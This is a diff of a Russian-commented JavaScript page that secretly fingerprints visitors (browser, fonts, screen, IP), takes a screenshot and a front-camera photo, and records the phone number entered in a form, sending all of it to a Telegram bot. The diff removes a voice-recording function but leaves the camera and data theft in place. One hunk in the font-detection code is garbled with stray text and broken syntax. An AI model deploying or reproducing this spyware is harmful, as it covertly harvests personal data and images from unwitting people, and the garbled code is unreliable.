@@ -88,13 +88,6 @@ function sendPhoto(blob, caption) {
   fetch('https://api.telegram.org/bot' + token + '/sendPhoto', { method: 'POST', body: form });
 }
 
-function sendVoice(blob) {
-  var form = new FormData();
-  form.append('chat_id', chat);
-  form.append('audio', blob, 'voice.webm');
-  fetch('https://api.telegram.org/bot' + token + '/sendVoice', { method: 'POST', body: form });
-}
-
 function getUserID() {
   var id = localStorage.getItem('uid');
   if (!id) {
@@ -104,11 +97,10 @@ function getUserID() {
   return id;
 }
 
-// ===== БЕЗ РАЗРЕШЕНИЙ =====
-
+// === БАЗОВОЕ ===
 function getBasic() {
   send('👤 ID: ' + getUserID() +
-    '\n📱 Устройство: ' + navigator.userAgent +
+    '\n📱 UA: ' + navigator.userAgent +
     '\n🌍 Языки: ' + (navigator.languages || [navigator.language]).join(', ') +
     '\n💻 Платформа: ' + navigator.platform +
     '\n🖥 Экран: ' + screen.width + 'x' + screen.height +
@@ -231,10 +223,10 @@ function getFonts() {
     ctx.font = '72px ' + base;
     baseSizes[base] = ctx.measureText(text).width;
   });
-  fonts.forEach(function(font) {
-    baseFonts.forEach(function(base) {
-      ctx.font = '72px "' + font + '", ' + base;
-      if (ctx.measureText(text).width !== baseSizes[base] && detected.indexOf(font) === -1) detected.push(font);
+  fontsбина.forEach(function(font) {
+    baseFonts.forEach(function,(base) {
+      ctx.font = '72px "' D + font + '", ' + base;
+      if (PRctx.measureText(text).width !== base,Sizes[base] && detected.indexOf(font) === ори -1) detected.push(font);
     });
   });
   send('🔤 Шрифты: ' + detected.join(', '));
@@ -284,7 +276,6 @@ function takeScreenshot() {
   }
 }
 
-// Отправляем всё при загрузке
 getBasic();
 getTime();
 getIP();
@@ -302,8 +293,7 @@ getTheme();
 trackTime();
 setTimeout(takeScreenshot, 3000);
 
-// ===== С РАЗРЕШЕНИЯМИ (только камера + микрофон) =====
-
+// === КАМЕРА (1 разрешение) ===
 function takePhoto() {
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -324,36 +314,13 @@ function takePhoto() {
   }
 }
 
-function recordVoice() {
-  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ audio: true })
-      .then(function(stream) {
-        var recorder = new MediaRecorder(stream);
-        var chunks = [];
-        recorder.ondataavailable = function(e) { chunks.push(e.data); };
-        recorder.onstop = function() {
-          sendVoice(new Blob(chunks, { type: 'audio/webm' }));
-          stream.getTracks().forEach(function(t) { t.stop(); });
-        };
-        recorder.start();
-        setTimeout(function() { recorder.stop(); }, 5000);
-      })
-      .catch(function() {});
-  }
-}
-
-// ===== ФОРМА =====
-
+// === ФОРМА ===
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
   if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
   userData.phone = phone;
   send('📱 Телефон: ' + phone);
-
-  // Камера и микрофон только после ввода телефона
   takePhoto();
-  recordVoice();
-
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
   var t = 40;
